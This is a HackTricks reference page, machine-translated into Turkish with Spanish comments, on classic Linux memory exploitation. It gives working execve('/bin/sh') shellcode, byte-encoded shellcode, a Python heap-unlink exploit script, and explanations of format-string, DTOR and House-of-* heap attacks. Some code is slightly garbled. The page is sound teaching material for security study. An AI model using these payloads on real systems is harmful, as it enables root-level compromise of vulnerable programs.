# Linux Exploiting (Temel) (SPA)

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## **2.SHELLCODE**

Kernel kesmelerini görüntüle: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax'ı temizle\
xor ebx, ebx ; ebx = 0 çünkü geçirilecek bir argüman yok\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Syscall'ı çalıştır

**nasm -f elf assembly.asm** —> Bir .o dosyası döndürür\
**ld assembly.o -o shellcodeout** —> Derlenmiş kodu içeren yürütülebilir dosyayı verir ve **objdump** ile opcode'ları çıkarabiliriz\
**objdump -d -Mintel ./shellcodeout** —> Gerçekten shellcodemuz olduğunu ve opcode'ları çıkarmak için

**Shellcodenin çalıştığını kontrol etmek**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
Para doğru sistem çağrılarının yapıldığını görmek için önceki programı derlemek ve sistem çağrılarının **strace ./DERLENMİŞ_PROGRAM** içinde görünmesi gerekir.

Shellcode'ları oluştururken bir hile yapılabilir. İlk talimat bir çağrıya bir sıçrama yapmaktır. Çağrı, orijinal kodu çağırır ve aynı zamanda EIP'yi yığına yerleştirir. Çağrı talimatından sonra ihtiyacımız olan dizeyi yerleştirdik, bu nedenle bu EIP ile dizeyi işaretleyebilir ve aynı zamanda kodu devam ettirebiliriz.

ÖR **HİLE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Stack Kullanarak EJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Yumurta Avcısı:**

Bir işleme ilişkilendirilmiş bellek sayfalarını dolaşan ve orada saklanan shellcode'u arayan küçük bir kod parçasıdır (shellcode'da yer alan bir imza arar). Kod enjekte etmek için sadece küçük bir alan olduğu durumlarda faydalıdır.

**Polimorfik Shellcode'lar**

Küçük kodlarla şifrelenmiş kabuklardır ve bunları çözen ve ona atlayan küçük kodlar içerirler, Call-Pop hilesini kullanarak şifrelenmiş bir örnek şöyle olabilir:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5. Ek Yöntemler**

**Ret2Ret**

EIP'ye bir adres yerleştirilemediğinde (EIP'nin 0xbf içermediği kontrol edilir) veya shellcode'un konumu hesaplanamadığında kullanışlıdır. Ancak, zafiyetli işlev bir parametre kabul eder (shellcode buraya gidecektir).

Bu şekilde, EIP'yi bir **ret** adresine değiştirerek, bir sonraki adres yüklenecektir (bu, işlevin ilk argümanının adresidir). Yani, shellcode yüklenecektir.

Saldırı şu şekilde olacaktır: SHELLCODE + Dolgu (EIP'ye kadar) + **\&ret** (yığına geçirilen adres, geçirilen parametre adresine işaret ettiği için yığının sonraki baytları shellcode'un başlangıcına işaret eder)

**strncpy** gibi işlevler, tamamlandığında yığında saklanan shellcode'un adresini kaldırarak bu tekniği imkansız hale getirir gibi görünmektedir. Yani, işlev için argüman olarak geçirilen adres (shellcode'u saklayan adres) 0x00 ile değiştirilir, bu nedenle ikinci **ret** çağrısında 0x00 ile karşılaşılır ve program çöker.

**Murat Tekniği**

Linux'ta tüm programlar 0xbfffffff'den başlayarak eşlenir.

Linux'ta yeni bir işlem yığını nasıl oluşturulduğunu göz önünde bulundurarak, bir programın yalnızca shellcode'un bulunduğu bir ortamda başlatılmasını sağlayacak bir saldırı geliştirilebilir. Bu durumda, shellcode'un bulunduğu ortam değişkeninin adresi şu şekilde hesaplanabilir: addr = 0xbfffffff - 4 - strlen(FULL_EXECUTABLE_NAME) - strlen(shellcode)

Bu şekilde, shellcode'un bulunduğu değişkenin adresi kolayca elde edilir.

Bu, execle işlevinin istenilen ortam değişkenlerini yalnızca oluşturmasına izin verdiği için mümkündür.

**ESP'ye Atlama: Windows Tarzı**

ESP her zaman yığının başlangıcına işaret ettiği için, bu teknik EIP'yi bir **jmp esp** veya **call esp** çağrısının adresiyle değiştirerek gerçekleştirilir. Böylece, shellcode, EIP'nin üzerine yazılmasından sonra kaydedilir çünkü **ret** işlemi gerçekleştikten sonra ESP, hemen ardından shellcode'un saklandığı yere işaret edecek şekilde bulunacaktır.

Windows veya Linux'ta ASLR etkin değilse, paylaşılan bir nesnede depolanan **jmp esp** veya **call esp** çağrıları yapılabilir. ASLR etkinse, zafiyetli program içinde arama yapılabilir.

Ayrıca, shellcode'u yığının ortasına yerleştirmek yerine EIP'nin bozulmasından sonra shellcode'u yerleştirebilmek, işlevin ortasında yürütülen push veya pop talimatlarının shellcode'a dokunmamasını sağlar (bu durum, işlevin yığının ortasına yerleştirilmesi durumunda meydana gelebilir).

Benzer şekilde, bir işlevin shellcode'un saklandığı adresi döndürdüğünü biliyorsak, **call eax** veya **jmp eax (ret2eax)** çağrıları yapılabilir.

**Tamsayı Taşmaları**

Bu tür taşmalar, bir değişkenin geçirilen kadar büyük bir sayıyı desteklemeye hazır olmadığında meydana gelir, muhtemelen işaretli ve işaretsiz değişkenler arasındaki karışıklıktan kaynaklanabilir, örneğin:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Önceki örnekte programın 2 parametre beklediğini görebiliriz. İlk parametre takip eden dizenin uzunluğu ve ikinci parametre dizedir.

Eğer ilk parametre olarak negatif bir sayı verirsek, len < 256 çıkacaktır ve bu filtreyi geçeceğiz, ayrıca strlen(buffer) da l'den daha küçük olacaktır, çünkü l unsigned int türündedir ve çok büyük olacaktır.

Bu tür aşırı taşmalar, programın işlemine bir şeyler yazmayı hedeflemez, ancak diğer zayıf noktaları sömürmek için kötü tasarlanmış filtreleri aşmayı amaçlar.

**Değişkenlerin Başlatılmaması**

Başlatılmamış bir değişkenin alabileceği değer bilinmez ve bunu gözlemlemek ilginç olabilir. Önceki işlevdeki bir değişkenin değerini alabilir ve bu değişken saldırgan tarafından kontrol edilebilir.

##

###

###

###

### **.fini\_array**

Temelde, bu programın bitmeden önce çağrılacak işlevlerin bulunduğu bir yapıdır. Bu, **shellcode'unuza bir adrese atlayarak çağırabiliyorsanız** veya format dizesini ikinci kez **sömürmek için tekrar main'e dönmek gerektiğinde** ilginç olabilir.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
### **İçerikleri Dökümlemek İçin Format Dizileri**

Bir format dizesi ayrıca programın belleğinden içerikleri dökmek için de kötüye kullanılabilir.\
Örneğin, aşağıdaki durumda, bir bayrağa işaret eden bir yerel değişken bulunmaktadır. Eğer bellekte bayrağa işaret eden işaretçinin nerede olduğunu bulursanız, `printf`'in o adresi erişmesini sağlayabilir ve bayrağı yazdırabilirsiniz:

Yani, bayrak **0xffffcf4c** adresindedir

![](<../../.gitbook/assets/image (618) (2).png>)

Ve sızıntıdan, bayrağa işaret eden işaretçinin **8.** parametrede olduğunu görebilirsiniz:

![](<../../.gitbook/assets/image (623).png>)

Bu nedenle, **8. parametreye erişerek** bayrağı alabilirsiniz:

![](<../../.gitbook/assets/image (624).png>)

Önceki saldırıyı takip ederek ve içerik sızdırabileceğinizi fark ederek, `printf`'e **işaretçileri ayarlayabilir** ve **yürütülebilir** olan bölüme **erişebilir** ve onu **tamamen dökebilirsiniz**!

### **DTOR**

{% hint style="danger" %}
Günümüzde bir dtor bölümü olan bir ikili bulmak çok **garip**.
{% endhint %}

Yıkıcılar, programın **sona ermeden önce yürütülen işlevlerdir**.\
Eğer bir **adresi** bir **shellcode**'a **yazmayı** başarırsanız, bu, programın sona ermeden önce **yürütülecektir**.\
Bu bölümün adresini alın:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
Genellikle **DTOR** bölümünü `ffffffff` ve `00000000` değerleri **arasında** bulacaksınız. Bu yüzden sadece bu değerleri görüyorsanız, bu, **herhangi bir fonksiyonun kaydedilmediği anlamına gelir**. Bu yüzden **`00000000`**'ı **üzerine yazarak** shellcode'ı **çalıştırmak için adresi** yazın.

### **Format Strings to Buffer Overflows**

**sprintf**, bir **değişkene** biçimlendirilmiş bir dize **taşır**. Bu nedenle, bir dizenin biçimlendirmesini **kullanarak**, içeriğin kopyalandığı değişkende bir **tampon taşmasına neden olabilirsiniz**.\
Örneğin, yük `%.44xAAAA`, değişkene **44B+"AAAA" yazacaktır**, bu da bir tampon taşmasına neden olabilir.

### **\_\_atexit Yapıları**

{% hint style="danger" %}
Bugünlerde bunu **saldırmak çok garip**.
{% endhint %}

**`atexit()`**, **parametre olarak başka fonksiyonların** geçirildiği bir işlevdir. Bu **fonksiyonlar**, bir **`exit()`** veya **main**'in **dönüşü sırasında yürütülecek**tir.\
Örneğin, bu **fonksiyonlardan herhangi birinin adresini** örneğin bir shellcode'a işaret etmek için **değiştirebilirseniz**, **işlemi kontrol edersiniz**, ancak bu şu anda daha karmaşıktır.\
Şu anda **yürütülecek fonksiyonların adresleri** birkaç yapı arkasında gizlenmiştir ve sonunda işaret ettiği adresler fonksiyonların adresleri değil, **XOR ile şifrelenmiş ve rastgele bir anahtarla kaydırılmıştır**. Bu nedenle, bu saldırı vektörü şu anda **en azından x86** ve **x64\_86** üzerinde çok kullanışlı değildir.\
**Şifreleme işlevi** **`PTR_MANGLE`**'dır. m68k, mips32, mips64, aarch64, arm, hppa gibi **diğer mimariler**, girdi olarak aldığı gibi **şifrelemeyi uygulamaz**. Bu nedenle, bu mimariler bu vektör tarafından saldırıya uğrayabilir.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Bugünlerde bunu **saldırmak çok garip**.
{% endhint %}

**`Setjmp()`**, **bağlamı** (kayıtları) **kaydetmeye izin verir**\
**`longjmp()`**, **bağlamı geri yüklemeye izin verir**.\
**Kaydedilen kayıtlar**: `EBX, ESI, EDI, ESP, EIP, EBP`\
Olan şudur ki EIP ve ESP **`PTR_MANGLE`** işlevi tarafından geçirilir, bu nedenle **bu saldırıya duyarlı mimariler yukarıdakiyle aynıdır**.\
Hata kurtarma veya kesmeler için kullanışlıdır.\
Ancak okuduğum kadarıyla, diğer kayıtların korunmadığını, bu nedenle `call ebx`, `call esi` veya `call edi` içeren işlevin içindeyken kontrolun alınabileceğini belirtir. Veya EBP'yi değiştirerek ESP'yi değiştirebilirsiniz.

**VTable ve VPTR in C++**

Her sınıfın bir **Vtable**'ı vardır, bu bir **yöntemler dizisidir**.

Her bir **sınıfın nesnesi**, sınıfının bir **dizisine işaret eden** bir **VPtr**'ye sahiptir. VPtr, her nesnenin başlığının bir parçasıdır, bu nedenle **VPtr'nin üzerine yazılması başarılı olursa**, bir işlevi yürütmek için bir dummy yönteme işaret edecek şekilde **değiştirilebilir**.

## **Önleyici ve Kaçınma Önlemleri**

###

**Libsafe Değiştirme**

Şununla etkinleştirilir: LD\_PRELOAD=/lib/libsafe.so.2\
veya\
“/lib/libsave.so.2” > /etc/ld.so.preload

Bazı güvensiz işlev çağrılarını güvenli işlevlerle değiştirir. Standart değildir. (yalnızca x86 için, -fomit-frame-pointer ile derlenmemiş, statik derlemeler için geçerli değil ve LD\_PRELOAD setuid olan ikili dosyalarda çalışmaz).

**ASCII Armored Adres Alanı**

Paylaşılan kütüphaneleri 0x00000000 ile 0x00ffffff arasında yüklemek, her zaman bir 0x00 baytının olmasını sağlar. Bununla birlikte, bu neredeyse hiçbir saldırıyı durdurmaz, özellikle little endian'da.

**ret2plt**

strcpy@plt işlevini (plt'den) çağırmak ve GOT girdisinin başına işlemek ve çağrılmak istenen işlevin (system()) ilk baytını kopyalamak için bir ROP gerçekleştirmek anlamına gelir. Ardından aynısını GOT+1'e işaret ederek system()'ın 2. baytını kopyalarsınız... Sonunda GOT'da saklanan adres çağrılır ve bu system() olacaktır.

**chroot() ile Kafesler**

debootstrap -arch=i386 hardy /home/user —> Belirli bir alt dizin altına temel bir sistem yükler

Bir yönetici, bu kafeslerden birinden çıkmak için şunu yapabilir: mkdir foo; chroot foo; cd ..

**Kod Enstrümantasyonu**

Valgrind —> Hataları arar\
Memcheck\
RAD (Return Address Defender)\
Insure++
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo está libre esté a 1**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, para que piense que el “size” del 3º trozo está 4bytes detrás (apunta a prev\_size) pues es ahí donde mira si el 2º trozo está libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Dirección de free() en la plt-12 (será la dirección que se sobrescrita para que se lanza la shellcode la 2º vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sí**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2º trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Kontrol ettiğimiz 3 ardışık parçayı ters sırayla serbest bırakıyoruz.

Bu durumda:

C parçasına shellcode yerleştirilir

A parçasını, A parçasının boş olduğunu düşünmesi için PREV\_INUSE bitini devre dışı bırakacak şekilde B'yi üzerine yazmak için kullanırız.

Ayrıca, başlık B'deki boyutu -4 olarak ayarlamak için üzerine yazılır.

Bu durumda, program "a" nın boş olduğunu ve bir bağda olduğunu düşünecek, bu yüzden unlink() işlevini çağıracak. Ancak, çünkü başlık PREV\_SIZE -4 olarak ayarlanmıştır. "a" parçasının aslında b+4'te başladığını düşünecek. Yani, b+4'te başlayan bir parçayı unlink() yapacak, bu nedenle b+12'de "fd" işaretçisi ve b+16'da "bk" işaretçisi olacak.

Bu şekilde, bk'ya shellcode adresini ve fd'ye "puts()" işlevinin adresini -12 olarak yerleştirirsek, payloadumuzu elde ederiz.

**Frontlink Tekniği**

Bir şey serbest bırakıldığında ve yanındaki parçalar boş değilse, unlink() çağrılmaz, doğrudan frontlink() çağrılır.

Saldırıya uğrayan malloc asla serbest bırakılmazsa yararlı bir zayıflık.

Gereksinimler:

Veri girişi işleviyle taşınabilir bir tampon

Bu tampona bitişik serbest bırakılacak ve başlık fd alanı taşınma tamponu tarafından değiştirilecek bir tampon

512'den büyük ancak önceki tamponu taşımak için küçük bir boyutta bir tampon

Bu adımdan önce bu tamponun prev\_size'ını üzerine yazmaya izin veren bir tampon

Bu şekilde, kontrolsüz iki malloc üzerine yazarak ve sadece birinin serbest bırakıldığı ancak diğerinin serbest bırakılmadığı bir saldırı yapabiliriz.

**Çift free() Zayıflığı**

Aynı işaretçiyle iki kez free() çağrılırsa, aynı adrese işaret eden iki bağ oluşur.

Birini tekrar kullanmak istendiğinde sorunsuz bir şekilde atanır. Diğerini kullanmak istendiğinde, önceki rezervasyonun yazacağı verilerle "fd" ve "bk" işaretçileri yanıltılır.

**Free() Sonrası**

Önceden serbest bırakılan bir işaretçi kontrolsüz bir şekilde yeniden kullanılır.

## **8 Heap Taşmaları: Gelişmiş Saldırılar**

Unlink() ve FrontLink() teknikleri unlink() işlevi değiştirilerek kaldırıldı.

**The house of mind**

Kodun keyfi olarak yürütülmesi için sadece bir free() çağrısı gereklidir. Önceki bir tampon tarafından taşınabilir ve serbest bırakılabilir bir ikinci tampon aranır.

Bir free() çağrısı, public\_fREe(mem) işlevini çağırır, bu işlev:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Bir parçanın başladığı adresi işaret eden bir işaretçi döndürür (mem-8)

…

ar\_ptr = arena\_for_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

\[1] kısmında boyut alanı NON\_MAIN_ARENA bitini kontrol eder, bu biti değiştirerek kontrolü true döndürebilir ve heap\_for\_ptr() işlevini çalıştırabilir, bu işlev "mem" üzerinde bir and işlemi yaparak en az anlamlı 2.5 baytı sıfırlar (örneğin 0x0804a000 için 0x08000000) ve 0x08000000->ar\_ptr adresine erişir (struct heap\_info gibi).

Bu şekilde, örneğin 0x0804a000 adresinde bir parçayı kontrol edebilir ve **0x081002a0** adresinde bir parçanın serbest bırakılacağını varsayarsak, 0x08100000 adresine ulaşabilir ve istediğimiz şeyi yazabiliriz, örneğin **0x0804a000**. Bu ikinci parça serbest bırakıldığında, heap\_for\_ptr(ptr)->ar\_ptr'yi 0x08100000 adresinde yazdığımızı görecektir (çünkü önce bahsettiğimiz and işlemi uygulanır ve buradan ilk 4 baytın değeri, ar\_ptr'yi çıkarır).

\_int\_free(ar\_ptr, mem) çağrılır, yani **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Önceki bölümde av değerini kontrol edebileceğimizi gördüğümüz gibi.

unsorted\_chunks nasıl tanımlandığına göre biliyoruz ki:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Bu nedenle, av->bins\[2] adresine \_\_DTOR\_END\_\_-12 değerini yazarsak, son talimatta \_\_DTOR\_END\_\_ adresine ikinci parçanın adresi yazılacaktır.

Yani, ilk parçada başlangıca \_\_DTOR\_END\_\_-12 adresini birçok kez yazmalıyız çünkü av->bins\[2] buradan alacaktır.

İkinci parçada ve ilk parçanın yardımıyla prev\_size'ı bir sıçrama 0x0c ve boyutu NON\_MAIN_ARENA'yı etkinleştirecek bir değerle üzerine yazıyoruz.

Ardından, ikinci parçaya bir sürü nops ve sonunda shellcode ekliyoruz.

Bu şekilde \_int\_free(TROZO1, TROZO2) çağrılacak ve \_\_DTOR\_END\_\_ adresine TROZO2'nin prev\_size adresi yazılacaktır, bu da shellcode'a atlayacaktır.
Bu tekniği uygulamak için payload'u biraz daha karmaşık hale getiren bazı gereksinimlerin karşılanması gerekmektedir.

Bu teknik artık uygulanabilir değil çünkü unlink için neredeyse aynı yama uygulandı. Yeni hedef siteye işaret edilip edilmediği kontrol edilir.

**Fastbin**

The house of mind'in bir varyantıdır.

\_int\_free() fonksiyonunun ilk kontrolünden sonra aşağıdaki kodu çalıştırmak istiyoruz:

fb = &(av->fastbins\[fastbin\_index(size)] —> fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

Bu şekilde, "fb" adresi GOT'taki bir fonksiyonun adresini verirse, bu adrese üzerine yazılacak olan parça adresi konulacaktır. Bunun için, arena'nın dtors adreslerine yakın olması gerekecektir. Daha doğrusu, av->max\_fast'in üzerine yazılacak olan adres olması gerekmektedir.

The House of Mind ile kontrol edildiği gibi, av'nin konumunu kontrol ettiğimizi gördük.

Bu durumda, boyut alanına 8 + NON\_MAIN\_ARENA + PREV\_INUSE boyutunu girersek —> fastbin\_index() bize fastbins\[-1] döndürecektir, bu da av->max\_fast'e işaret edecektir.

Bu durumda av->max\_fast'in üzerine yazılacak (işaret edilen değil, üzerine yazılacak olan pozisyon) adres olacaktır.

Ayrıca, serbest bırakılan parçanın bitişik parçasının 8'den büyük olması gerekmektedir -> Serbest bırakılan parçanın boyutunun 8 olduğunu söylediğimize göre, bu sahte parçaya sadece 8'den büyük bir boyut koymamız gerekmektedir (ayrıca shellcode'un serbest bırakılan parçada olacağını düşünürsek, sahte parçanın boyut alanının hemen başına bir jmp koymamız gerekecektir).

Ayrıca, aynı sahte parçanın av->system\_mem'den küçük olması gerekmektedir. av->system\_mem 1848 bayt daha ileridedir.

\_DTOR\_END\_ ve GOT'taki az sayıda adres nedeniyle, bu bölümlerin hiçbiri üzerine yazılacak uygun bir adres olmadığından, pili hedeflemek için fastbin'i nasıl uygulayacağımıza bakalım.

Başka bir saldırı şekli, **av**'yi pile yönlendirmektir.

Boyutu 8 yerine 16 yapacak şekilde boyutu değiştirirsek: fastbin\_index() bize fastbins\[0] döndürecektir ve bunu pile yazmak için kullanabiliriz.

Bunun için pile hiçbir canary veya garip değer olmamalıdır, aslında şu şekilde olmalıdır: 4 bayt null + EBP + RET

4 bayt null, **av**'nin bu adrese işaret edeceği ve bir **av**'nin ilk öğesinin 0 olması gereken mutexe işaret etmesi gerekmektedir.

**av->max\_fast** EBP olacak ve bizi kısıtlamalardan geçirecek bir değer olacaktır.

**av->fastbins\[0]** adresi **p**'nin adresiyle üzerine yazılacak ve RET olacaktır, böylece shellcode'a atlanacaktır.

Ayrıca, **av->system\_mem** (pile göre 1484 bayt yukarıda) bize izin verecek kadar çok çöp olmalıdır.

Serbest bırakılan parçanın bitişik parçasının 8'den büyük olması gerekmektedir -> Serbest bırakılan parçanın boyutunun 16 olduğunu söylediğimize göre, bu sahte parçaya sadece 8'den büyük bir boyut koymamız gerekmektedir (ayrıca shellcode'un serbest bırakılan parçada olacağını düşünürsek, sahte parçanın boyut alanının hemen başına bir jmp koymamız gerekecektir).

**The House of Spirit**

Bu durumda, saldırgan tarafından değiştirilebilen bir malloc işaretçisine sahip bir malloc'a ihtiyaç vardır (örneğin, işaretçinin bir değişken üzerindeki taşmaya karşı stack'te olması).

Böylece, bu işaretçinin istenilen yere işaret etmesini sağlayabiliriz. Ancak, herhangi bir yer uygun değildir, sahte parçanın boyutu av->max\_fast'ten küçük olmalı ve daha spesifik olarak gelecekteki bir malloc() çağrısında istenen boyuta 8 eklenmelidir. Bu nedenle, eğer bu savunmasız işaretçiden sonra 40'a malloc(40) çağrılacağını biliyorsak, sahte parçanın boyutu 48 olmalıdır.

Örneğin, program kullanıcıdan bir sayı istediğinde 48 girebilir ve değiştirilebilir malloc işaretçisini 4 sonraki byte'a (şans eseri EBP'ye ait olabilir, böylece 48 arkada kalır, sanki başlık boyutuymuş gibi) yönlendirebiliriz. Ayrıca, ptr-4+48 adresinin çeşitli koşulları karşılaması gerekmektedir (bu durumda ptr=EBP), yani 8 < ptr-4+48 < av->system\_mem.

Bu koşullar sağlandığında, söz konusu malloc çağrıldığında (malloc(40) olduğunu söylediğimizde), EBP'nin adresi olarak bu işaretçi atanacaktır. Saldırgan ayrıca bu malloc'a ne yazılacağını kontrol edebiliyorsa, EBP ve EIP'yi istediği adrese üzerine yazabilir.

Bu, çünkü free() bu stack'teki EBP'ye işaret eden bir parça olduğunu hatırlayacak ve yeni malloc() için rezerve edilmek istenen mükemmel boyutta bir parça olduğunu kaydedecektir, bu yüzden o adrese atayacaktır.

**The House of Force**

Gereksinimler:

* Wilderness'ı üzerine yazılabilir hale getiren bir parça taşması
* Kullanıcı tarafından tanımlanan boyutta bir malloc() çağrısı
* Kullanıcı tarafından tanımlanan verilere sahip bir malloc() çağrısı

İlk olarak, wilderness parçasının boyutunu çok büyük bir değerle (0xffffffff) üzerine yazmak gerekmektedir, böylece yeterince büyük bir bellek talebi \_int\_malloc() tarafından heap'i genişletmeden işlenecektir.

İkinci olarak, av->top'un saldırganın kontrolü altındaki bir bellek bölgesine, örneğin stack'e işaret etmesi gerekmektedir. av->top'a \&EIP - 8 konulacaktır.

Saldırganın kontrolü altındaki bellek bölgesine işaret eden av->top'u üzerine yazmak gerekmektedir:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim, mevcut wilderness parçasının adresini (mevcut av->top) alır ve remainder tam olarak bu adresin malloc() tarafından talep edilen bayt sayısı kadar ilerisine işaret eder. Bu nedenle, \&EIP-8'in 0xbffff224 olduğu ve av->top'un 0x080c2788 olduğu durumda, av->top'un bir sonraki malloc() için \&EIP-8'e işaret etmesi gereken kontrol edilen malloc için rezerve edilmesi gereken bayt miktarı şudur:

0xbffff224 - 0x080c2788 = 3086207644.

Bu şekilde, değiştirilmiş değer av->top'a kaydedilir ve bir sonraki malloc EIP'ye işaret eder ve üzerine yazılabilir.

Yeni wilderness parçasının boyutunun, son malloc() tarafından yapılan talepten daha büyük olması gerekmektedir. Yani, wilderness \&EIP-8'e işaret ediyorsa, boyut tam olarak stack'teki EBP alanında kalacaktır.

**The House of Lore**

**SmallBin Bozulması**

Serbest bırakılan parçalar, boyutlarına göre bir bine yerleştirilir. Ancak, unsorted bins'e önce yerleştirilirler. Bir parça serbest bırakıldığında hemen bine konulmaz, unsorted bins'te kalır. Ardından, yeni bir parça rezerve edilirse ve önceki serbest bırakılan parça yeterliyse geri verilir, ancak daha büyük bir parça rezerve edilirse, unsorted bins'teki serbest bırakılan parça uygun bine konulur.

Zararlı kodun ulaşılabilmesi için bellek talebi av->max\_fast'ten büyük (genellikle 72) ve MIN\_LARGE\_SIZE'dan küçük (512) olmalıdır.

Eğer bine uygun boyutta bir parça varsa, bu parça çözümlendikten sonra geri verilir:

bck = victim->bk; Önceki parçaya işaret eder, değiştirebileceğimiz tek bilgidir.

bin->bk = bck; Önceki parça son parça olur, bck stack'e işaret ediyorsa, bir sonraki rezerve edilen parçaya bu adres verilecektir.

bck->fd = bin; Liste kapatılır ve bu bin'e işaret eder.

Gereksinimler:
İki malloc ayrılmalı, böylece ikincisi serbest bırakıldıktan sonra ilkine taşma yapılabilir (yani taşma yapmadan önce ikinci parça serbest bırakılıp binine yerleştirilmiş olmalıdır).

Saldırgan tarafından seçilen adresi alan malloc ayrılmış olmalı.

